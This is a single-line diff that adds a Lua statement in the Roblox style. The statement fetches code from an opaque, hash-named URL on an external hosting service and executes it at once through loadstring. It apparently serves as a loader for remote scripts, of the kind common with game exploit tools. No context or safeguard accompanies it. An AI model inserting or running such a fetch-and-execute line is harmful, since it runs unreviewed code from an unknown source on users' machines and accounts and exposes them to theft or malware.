@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://lua-script-hosting-api.vercel.app/api/boot/8b6de330dba965a3530076bb227f3020bb3616f1b136cc7f47595c0579f56b8b"))()
